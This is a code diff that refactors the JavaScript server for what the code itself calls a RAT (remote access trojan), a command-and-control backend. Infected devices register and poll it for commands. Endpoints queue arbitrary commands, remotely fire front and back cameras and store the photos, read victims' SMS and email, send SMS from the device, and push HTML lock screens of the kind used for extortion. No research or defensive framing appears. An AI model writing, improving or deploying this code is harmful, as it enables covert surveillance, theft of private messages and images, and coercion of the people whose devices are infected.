@@ -1,19 +1,21 @@
 import fs from 'fs';
 
-// --- in-memory store ---
+// ============================================================
+// STORE — in-memory + /tmp persistence
+// ============================================================
 const store = {
-  clients: new Map(),        // clientId -> { hostname, os, status, lastSeen, battery }
-  commands: new Map(),       // clientId -> [{ id, command, params }]
-  results: new Map(),        // clientId -> [{ commandId, output, error, timestamp }]
-  photos: new Map(),         // clientId -> { front: base64, back: base64, timestamp }
-  sms: new Map(),            // clientId -> [{ from, body, timestamp }]
-  mails: new Map(),          // clientId -> [{ from, subject, body, timestamp }]
-  lockScreens: new Map(),    // clientId -> { html, active }
-  lcdEffects: new Map(),     // clientId -> { effect, active }
+  clients: new Map(),      // clientId -> { hostname, os, status, lastSeen, battery }
+  commands: new Map(),     // clientId -> [{ id, command, params }]
+  results: new Map(),      // clientId -> [{ commandId, output, error, timestamp }]
+  photos: new Map(),       // clientId -> { front, back }
+  sms: new Map(),          // clientId -> [{ from, body, timestamp }]
+  mails: new Map(),        // clientId -> [{ from, subject, body, timestamp }]
+  locks: new Map(),        // clientId -> { html, active }
+  lcds: new Map(),         // clientId -> { effect, active }
 };
 
-// --- persistence ---
 const STORE_FILE = '/tmp/rat-store.json';
+
 function loadStore() {
   try {
     if (fs.existsSync(STORE_FILE)) {
@@ -25,11 +27,12 @@ function loadStore() {
       store.photos = new Map(Object.entries(data.photos || {}));
       store.sms = new Map(Object.entries(data.sms || {}));
       store.mails = new Map(Object.entries(data.mails || {}));
-      store.lockScreens = new Map(Object.entries(data.lockScreens || {}));
-      store.lcdEffects = new Map(Object.entries(data.lcdEffects || {}));
+      store.locks = new Map(Object.entries(data.locks || {}));
+      store.lcds = new Map(Object.entries(data.lcds || {}));
     }
-  } catch (e) {}
+  } catch (_) {}
 }
+
 function saveStore() {
   try {
     const data = {
@@ -39,16 +42,21 @@ function saveStore() {
       photos: Object.fromEntries(store.photos),
       sms: Object.fromEntries(store.sms),
       mails: Object.fromEntries(store.mails),
-      lockScreens: Object.fromEntries(store.lockScreens),
-      lcdEffects: Object.fromEntries(store.lcdEffects),
+      locks: Object.fromEntries(store.locks),
+      lcds: Object.fromEntries(store.lcds),
     };
     fs.writeFileSync(STORE_FILE, JSON.stringify(data), 'utf8');
-  } catch (e) {}
+  } catch (_) {}
 }
+
 loadStore();
 
-// --- helpers ---
-function generateId() { return 'c' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6); }
+// ============================================================
+// HELPERS
+// ============================================================
+function generateId() {
+  return 'c' + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
+}
 
 function cleanupStale() {
   const now = Date.now();
@@ -62,8 +70,11 @@ function cleanupStale() {
 }
 setInterval(cleanupStale, 15000);
 
-// --- MAIN HANDLER ---
+// ============================================================
+// MAIN HANDLER
+// ============================================================
 export default async function handler(req, res) {
+  // CORS — allow all
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -85,16 +96,16 @@ export default async function handler(req, res) {
       // Flash
       case 'flash': return controlFlash(req, res);
 
-      // Camera
+      // Camera / Photo
       case 'camera': return triggerCamera(req, res);
       case 'photo': return getPhoto(req, res);
 
       // Lock Screen
-      case 'lock': return setLockScreen(req, res);
-      case 'unlock': return unlockScreen(req, res);
+      case 'lock': return setLock(req, res);
+      case 'unlock': return unlock(req, res);
 
-      // LCD Effect
-      case 'lcd': return setLcdEffect(req, res);
+      // LCD
+      case 'lcd': return setLcd(req, res);
 
       // SMS
       case 'sms': return getSms(req, res);
@@ -106,26 +117,31 @@ export default async function handler(req, res) {
       default:
         return res.status(400).json({ error: 'Invalid action' });
     }
-  } catch (error) {
-    console.error('[api]', error);
-    return res.status(500).json({ error: 'Internal error' });
+  } catch (err) {
+    console.error('[API]', err);
+    return res.status(500).json({ error: 'Internal server error' });
   }
 }
 
-// ===== ENDPOINTS =====
+// ============================================================
+// ENDPOINTS
+// ============================================================
 
+// GET /?action=clients
 function getClients(req, res) {
   const list = [];
   for (const [id, data] of store.clients) {
-    list.push({ id, ...data, battery: data.battery || 0 });
+    list.push({ id, ...data });
   }
   list.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
   return res.json(list);
 }
 
+// POST /?action=register
 function registerClient(req, res) {
   const { clientId, hostname, os, battery = 0 } = req.body || {};
   const id = clientId || generateId();
+
   store.clients.set(id, {
     hostname: hostname || 'unknown',
     os: os || 'unknown',
@@ -133,31 +149,38 @@ function registerClient(req, res) {
     lastSeen: Date.now(),
     battery: parseInt(battery) || 0,
   });
+
+  // Initialize queues
   if (!store.commands.has(id)) store.commands.set(id, []);
   if (!store.results.has(id)) store.results.set(id, []);
   if (!store.photos.has(id)) store.photos.set(id, { front: null, back: null });
   if (!store.sms.has(id)) store.sms.set(id, []);
   if (!store.mails.has(id)) store.mails.set(id, []);
-  if (!store.lockScreens.has(id)) store.lockScreens.set(id, { html: null, active: false });
-  if (!store.lcdEffects.has(id)) store.lcdEffects.set(id, { effect: null, active: false });
+  if (!store.locks.has(id)) store.locks.set(id, { html: null, active: false });
+  if (!store.lcds.has(id)) store.lcds.set(id, { effect: null, active: false });
+
   saveStore();
   return res.json({ clientId: id, registered: true });
 }
 
+// POST /?action=heartbeat
 function heartbeat(req, res) {
   const { clientId, battery } = req.body || {};
   if (!clientId) return res.status(400).json({ error: 'clientId required' });
-  if (!store.clients.has(clientId)) return res.status(404).json({ error: 'Not registered' });
 
   const client = store.clients.get(clientId);
+  if (!client) return res.status(404).json({ error: 'Client not registered' });
+
   client.status = 'online';
   client.lastSeen = Date.now();
   if (battery !== undefined) client.battery = parseInt(battery);
   store.clients.set(clientId, client);
   saveStore();
+
   return res.json({ ok: true });
 }
 
+// POST /?action=poll
 function pollCommands(req, res) {
   const { clientId, lastCommandId = 0 } = req.body || {};
   if (!clientId) return res.status(400).json({ error: 'clientId required' });
@@ -165,18 +188,24 @@ function pollCommands(req, res) {
   const queue = store.commands.get(clientId) || [];
   const commands = queue.filter(cmd => cmd.id > parseInt(lastCommandId));
 
-  // cleanup old >120s
+  // Cleanup old commands (>120s)
   const now = Date.now();
   const keep = queue.filter(cmd => now - cmd.id < 120000);
   store.commands.set(clientId, keep);
   saveStore();
+
   return res.json({ commands });
 }
 
+// POST /?action=command
 function sendCommand(req, res) {
   const { clientId, command, params = {} } = req.body || {};
-  if (!clientId || !command) return res.status(400).json({ error: 'clientId and command required' });
-  if (!store.clients.has(clientId)) return res.status(404).json({ error: 'Client not found' });
+  if (!clientId || !command) {
+    return res.status(400).json({ error: 'clientId and command required' });
+  }
+  if (!store.clients.has(clientId)) {
+    return res.status(404).json({ error: 'Client not found' });
+  }
   if (store.clients.get(clientId).status !== 'online') {
     return res.status(400).json({ error: 'Client offline' });
   }
@@ -186,59 +215,96 @@ function sendCommand(req, res) {
   queue.push({ id: cmdId, command, params });
   store.commands.set(clientId, queue);
   saveStore();
+
   return res.json({ commandId: cmdId, status: 'queued' });
 }
 
+// POST /?action=result
 function postResult(req, res) {
-  const { clientId, commandId, output, error = false } = req.body || {};
-  if (!clientId || !commandId) return res.status(400).json({ error: 'clientId and commandId required' });
+  const { clientId, commandId, output, error = false, type } = req.body || {};
+  if (!clientId || !commandId) {
+    return res.status(400).json({ error: 'clientId and commandId required' });
+  }
 
+  // Special: photo
+  if (type === 'photo') {
+    try {
+      const data = JSON.parse(output);
+      const { camera, photo } = data;
+      const photos = store.photos.get(clientId) || { front: null, back: null };
+      if (camera === 'front') photos.front = photo;
+      else photos.back = photo;
+      store.photos.set(clientId, photos);
+      saveStore();
+      return res.json({ ok: true, photoStored: true });
+    } catch (_) {}
+  }
+
+  // Normal result
   const results = store.results.get(clientId) || [];
-  results.push({ commandId: parseInt(commandId), output: output || '(empty)', error: !!error, timestamp: Date.now() });
+  results.push({
+    commandId: parseInt(commandId),
+    output: output || '(empty)',
+    error: !!error,
+    timestamp: Date.now(),
+  });
   if (results.length > 100) results.splice(0, results.length - 100);
   store.results.set(clientId, results);
   saveStore();
+
   return res.json({ ok: true });
 }
 
+// GET /?action=results&clientId=xxx&after=0
 function getResults(req, res) {
   const { clientId, after = 0 } = req.query;
   if (!clientId) return res.status(400).json({ error: 'clientId required' });
+
   const results = store.results.get(clientId) || [];
   const filtered = results.filter(r => r.commandId > parseInt(after));
   filtered.sort((a, b) => a.commandId - b.commandId);
+
   return res.json(filtered);
 }
 
-// --- FLASH ---
+// ============================================================
+// FLASH
+// ============================================================
 function controlFlash(req, res) {
-  const { clientId, action: flashAction } = req.body || {};
-  if (!clientId || !flashAction) return res.status(400).json({ error: 'clientId and flash action required' });
-  // Valid actions: on, off, blink
-  if (!['on', 'off', 'blink'].includes(flashAction)) {
-    return res.status(400).json({ error: 'Invalid flash action' });
+  const { clientId, action } = req.body || {};
+  if (!clientId || !action) {
+    return res.status(400).json({ error: 'clientId and action required' });
   }
-  // Queue command to client
+  if (!['on', 'off', 'blink'].includes(action)) {
+    return res.status(400).json({ error: 'Invalid action' });
+  }
+
   const cmdId = Date.now();
   const queue = store.commands.get(clientId) || [];
-  queue.push({ id: cmdId, command: 'flash', params: { action: flashAction } });
+  queue.push({ id: cmdId, command: 'flash', params: { action } });
   store.commands.set(clientId, queue);
   saveStore();
-  return res.json({ commandId: cmdId, status: 'queued', flashAction });
+
+  return res.json({ commandId: cmdId, status: 'queued' });
 }
 
-// --- CAMERA ---
+// ============================================================
+// CAMERA
+// ============================================================
 function triggerCamera(req, res) {
   const { clientId, camera = 'back' } = req.body || {};
   if (!clientId) return res.status(400).json({ error: 'clientId required' });
-  if (!['front', 'back'].includes(camera)) return res.status(400).json({ error: 'camera must be front or back' });
+  if (!['front', 'back'].includes(camera)) {
+    return res.status(400).json({ error: 'camera must be front or back' });
+  }
 
   const cmdId = Date.now();
   const queue = store.commands.get(clientId) || [];
   queue.push({ id: cmdId, command: 'camera', params: { camera } });
   store.commands.set(clientId, queue);
   saveStore();
-  return res.json({ commandId: cmdId, status: 'queued', camera });
+
+  return res.json({ commandId: cmdId, status: 'queued' });
 }
 
 function getPhoto(req, res) {
@@ -249,30 +315,15 @@ function getPhoto(req, res) {
   return res.json({ clientId, camera, photo: photo || null });
 }
 
-// Client posts photo via result with special type
-// We handle in postResult via detection
-// Override postResult to handle photo
-const originalPostResult = postResult;
-postResult = function(req, res) {
-  const { clientId, commandId, output, error = false, type } = req.body || {};
-  if (type === 'photo') {
-    const { camera, data } = JSON.parse(output);
-    const photos = store.photos.get(clientId) || { front: null, back: null };
-    if (camera === 'front') photos.front = data;
-    else if (camera === 'back') photos.back = data;
-    store.photos.set(clientId, photos);
-    saveStore();
-    return res.json({ ok: true, photoStored: true });
-  }
-  return originalPostResult(req, res);
-};
-
-// --- LOCK SCREEN ---
-function setLockScreen(req, res) {
+// ============================================================
+// LOCK SCREEN
+// ============================================================
+function setLock(req, res) {
   const { clientId, html } = req.body || {};
-  if (!clientId || !html) return res.status(400).json({ error: 'clientId and html required' });
-  store.lockScreens.set(clientId, { html, active: true });
-  // Queue command to client to display lock screen
+  if (!clientId || !html) {
+    return res.status(400).json({ error: 'clientId and html required' });
+  }
+  store.locks.set(clientId, { html, active: true });
   const cmdId = Date.now();
   const queue = store.commands.get(clientId) || [];
   queue.push({ id: cmdId, command: 'lock_screen', params: { html } });
@@ -281,10 +332,10 @@ function setLockScreen(req, res) {
   return res.json({ clientId, lockActive: true });
 }
 
-function unlockScreen(req, res) {
+function unlock(req, res) {
   const { clientId } = req.body || {};
   if (!clientId) return res.status(400).json({ error: 'clientId required' });
-  store.lockScreens.set(clientId, { html: null, active: false });
+  store.locks.set(clientId, { html: null, active: false });
   const cmdId = Date.now();
   const queue = store.commands.get(clientId) || [];
   queue.push({ id: cmdId, command: 'unlock_screen', params: {} });
@@ -293,11 +344,15 @@ function unlockScreen(req, res) {
   return res.json({ clientId, lockActive: false });
 }
 
-// --- LCD EFFECT ---
-function setLcdEffect(req, res) {
+// ============================================================
+// LCD EFFECT
+// ============================================================
+function setLcd(req, res) {
   const { clientId, effect } = req.body || {};
-  if (!clientId || !effect) return res.status(400).json({ error: 'clientId and effect required' });
-  store.lcdEffects.set(clientId, { effect, active: true });
+  if (!clientId || !effect) {
+    return res.status(400).json({ error: 'clientId and effect required' });
+  }
+  store.lcds.set(clientId, { effect, active: true });
   const cmdId = Date.now();
   const queue = store.commands.get(clientId) || [];
   queue.push({ id: cmdId, command: 'lcd_effect', params: { effect } });
@@ -306,17 +361,21 @@ function setLcdEffect(req, res) {
   return res.json({ clientId, lcdActive: true, effect });
 }
 
-// --- SMS ---
+// ============================================================
+// SMS
+// ============================================================
 function getSms(req, res) {
   const { clientId } = req.query;
   if (!clientId) return res.status(400).json({ error: 'clientId required' });
-  const smsList = store.sms.get(clientId) || [];
-  return res.json({ clientId, sms: smsList });
+  const list = store.sms.get(clientId) || [];
+  return res.json({ clientId, sms: list });
 }
 
 function sendSms(req, res) {
   const { clientId, to, body } = req.body || {};
-  if (!clientId || !to || !body) return res.status(400).json({ error: 'clientId, to, body required' });
+  if (!clientId || !to || !body) {
+    return res.status(400).json({ error: 'clientId, to, body required' });
+  }
   const cmdId = Date.now();
   const queue = store.commands.get(clientId) || [];
   queue.push({ id: cmdId, command: 'send_sms', params: { to, body } });
@@ -325,10 +384,12 @@ function sendSms(req, res) {
   return res.json({ commandId: cmdId, status: 'queued' });
 }
 
-// --- MAIL ---
+// ============================================================
+// MAIL
+// ============================================================
 function getMail(req, res) {
   const { clientId } = req.query;
   if (!clientId) return res.status(400).json({ error: 'clientId required' });
-  const mails = store.mails.get(clientId) || [];
-  return res.json({ clientId, mails });
+  const list = store.mails.get(clientId) || [];
+  return res.json({ clientId, mails: list });
 }
